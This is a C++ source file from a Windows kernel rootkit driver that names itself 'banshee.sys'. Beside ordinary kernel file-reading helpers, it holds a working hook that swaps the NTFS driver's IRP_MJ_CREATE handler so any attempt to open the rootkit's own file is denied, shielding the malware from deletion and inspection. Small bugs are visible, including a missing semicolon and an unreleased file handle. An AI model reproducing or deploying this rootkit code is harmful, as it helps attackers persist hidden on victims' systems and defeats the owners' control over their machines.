#include "FileUtils.hpp"
#include "Debug.hpp"
#include "Globals.hpp"

/*
 * @brief Retrieves the filename from a given full path.
 *
 * @param[in] FullPath Pointer to a wide character string representing the full path.
 *
 * @return PWCH Pointer to the character following the last backslash in the path.
 */
PWCH
BeGetFilenameFromPath(
    _In_ PWCH fullPath
)
{
    //
    // Find the last occurrence of backslash in the full path
    //
    PWCH lastSlash = nullptr;
    PWCH current = fullPath;
    while (*current != L'\0')
    {
        if (*current == L'\\')
        {
            lastSlash = current;
        }
        current++;
    }

    //
    // If a backslash is found, return the pointer to the character after the backslash
    //
    if (lastSlash != nullptr)
    {
        return lastSlash + 1;
    }
    else
    {
        //
        // Otherwise, return the original pointer (assuming fullPath points to the filename itself)
        //
        return fullPath;
    }
}

/*
 * @brief Retrieves the driver object of the NTFS driver.
 *
 * @param[out] NtfsDriverObject Pointer to a variable to receive the pointer to the NTFS driver object.
 *
 * @return NTSTATUS STATUS_SUCCESS if successful, otherwise an error code.
 */
NTSTATUS
BeGetNtfsDriverObject(
    _Out_ PDRIVER_OBJECT* pNtfsDriverObject
)
{
    UNICODE_STRING    usNtfsDriverName = RTL_CONSTANT_STRING(L"\\FileSystem\\NTFS");
    OBJECT_ATTRIBUTES oa = { 0 };

    InitializeObjectAttributes(&oa, &usNtfsDriverName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    //
    // Get a pointer to the driver object representing the NTFS driver
    //
    NTSTATUS status = BeGlobals::pObReferenceObjectByName(&usNtfsDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)pNtfsDriverObject);
    if (!NT_SUCCESS(status))
        return status;

    return STATUS_SUCCESS;
}

/*
 * @brief Reads the contents of a file into a dynamically allocated buffer.
 *
 * @param[in]  FilePath  Pointer to a wide string containing the full path to the file.
 * @param[out] OutBuffer Pointer to a memory location that will receive the allocated buffer.
 * @param[out] Outsize   Pointer to a variable that will receive the size of the allocated buffer.
 *
 * @return NTSTATUS STATUS_SUCCESS if the file was successfully read, otherwise an error code.
 */
NTSTATUS
BeReadFile(
    _In_  PCWSTR  filePath,
    _Out_ PVOID* outBuffer,
    _Out_ PSIZE_T outsize
)
{
    HANDLE                    hFile = NULL;
    OBJECT_ATTRIBUTES         oa = { 0 };
    IO_STATUS_BLOCK           ioStatus = { 0 };
    UNICODE_STRING            path = { 0 };
    FILE_STANDARD_INFORMATION fileInfo = { 0 };
    LARGE_INTEGER             byteOffset = { 0 };

    WCHAR ntPath[256 + 10];
    RtlZeroMemory(ntPath, sizeof(ntPath));

    //
    // Construct the full NT path by prefixing "\??\"
    //
    NTSTATUS status = RtlStringCchCopyW(ntPath, ARRAYSIZE(ntPath), L"\\??\\");
    if (!NT_SUCCESS(status))
    {
        LOG_MSG("RtlStringCchCopyW Failed With Status: %d\n", status);
        return status;
    }

    //
    // Append the provided file path to the NT path
    //
    status = RtlStringCchCatW(ntPath, ARRAYSIZE(ntPath), filePath);
    if (!NT_SUCCESS(status))
    {
        LOG_MSG("RtlStringCchCatW Failed With Status: %d\n", status);
        return status;
    }

    LOG_MSG("File NT: %ws\n", ntPath);

    //
    // Initialize the UNICODE_STRING and OBJECT_ATTRIBUTES for the file
    //
    RtlInitUnicodeString(&path, ntPath);
    InitializeObjectAttributes(&oa, &path, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    //
    // Open the file with read access
    //
    status = ZwCreateFile(
        &hFile,
        GENERIC_READ | SYNCHRONIZE,
        &oa,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        LOG_MSG("ZwCreateFile Failed With Status: %d\n", status);
        return status;
    }

    //
    // Query the file size
    //
    status = ZwQueryInformationFile(
        hFile,
        &ioStatus,
        &fileInfo,
        sizeof(FILE_STANDARD_INFORMATION),
        FileStandardInformation
    );

    if (!NT_SUCCESS(status))
    {
        LOG_MSG("ZwQueryInformationFile Failed With Status: %d\n", status);
        return status;
    }

    //
    // Allocate a buffer to store the file contents
    //
    SIZE_T size = fileInfo.EndOfFile.QuadPart;
    *outBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, size, DRIVER_TAG);
    *outsize = size;

    //
    // Read the file into the allocated buffer
    //
    status = ZwReadFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        *outBuffer,
        static_cast<ULONG>(size),
        &byteOffset,
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        LOG_MSG("ZwReadFile Failed With Status: %d\n", status);
        return status;
    }

    return status;
}

#if DENY_DRIVER_FILE_ACCESS
/**
 * Hooked IRP_MJ_CREATE handler for the NTFS driver.
 * Denies access to the file if the filename matches the rootkit driver filename "banshee.sys",
 * otherwise calls the original NTFS IRP_MJ_CREATE handler.
 *
 * @param DeviceObject Pointer to the target device object.
 * @param Irp Pointer to the I/O Request Packet (IRP).
 * @return STATUS_ACCESS_DENIED if access to the file is denied, otherwise returns the result of the original function.
 */
NTSTATUS
BeHooked_NTFS_IRP_MJ_CREATE(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);

    // Get filename of file that will be accessed
    PWCH fullPath = pIoStackIrp->FileObject->FileName.Buffer;

    // If the file that will be accessed is our rootkit driver, deny access to the file
    // This doesnt hide the file, but protects it from deletion or read access
    UNICODE_STRING driverName = RTL_CONSTANT_STRING(L"banshee.sys")
        if (!BeIsStringNull(fullPath) &&
            (RtlCompareUnicodeString(BeGetFilenameFromPath(fullPath), &driverName, TRUE) == 0))
        {
            LOG_MSG("Filename: %ws\n", fullPath);
            Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
            return STATUS_SUCCESS;
        }

    // else call the original function
    return BeGlobals::OriginalNTFS_IRP_MJ_CREATE_function(DeviceObject, Irp);
}

/**
 * Hooks the IRP_MJ_CREATE function of the NTFS driver.
 *
 * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
 */
NTSTATUS
BeHookNTFSFileCreate()
{
    PDRIVER_OBJECT ntfsDriverObject;
    NTSTATUS NtStatus = BeGetNtfsDriverObject(&ntfsDriverObject);

    if (NtStatus != 0)
    {
        LOG_MSG("Failed to get ntfs driver object, (0x%08X)\n", NtStatus);
        return NtStatus;
    }

    // Get the MJ_CREATE function of the ntfs driver and save it to the global variable
    // Also put our function as the IRP_MJ_CREATE handler instead
    BeGlobals::OriginalNTFS_IRP_MJ_CREATE_function = (NTFS_IRP_MJ_CREATE_FUNCTION)InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)BeHooked_NTFS_IRP_MJ_CREATE);

    ObDereferenceObject(ntfsDriverObject);
    return STATUS_SUCCESS;
}

/**
 * Unhooks the IRP_MJ_CREATE function of the NTFS driver.
 *
 * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
 */
NTSTATUS
BeUnhookNTFSFileCreate()
{
    PDRIVER_OBJECT ntfsDriverObject;
    NTSTATUS NtStatus = BeGetNtfsDriverObject(&ntfsDriverObject);

    if (NtStatus != 0)
    {
        LOG_MSG("Failed to get ntfs driver object, (0x%08X)\n", NtStatus);
        return NtStatus;
    }

    // Restore the original address
    InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)BeGlobals::OriginalNTFS_IRP_MJ_CREATE_function);

    ObDereferenceObject(ntfsDriverObject);
    return STATUS_SUCCESS;
}
#endif 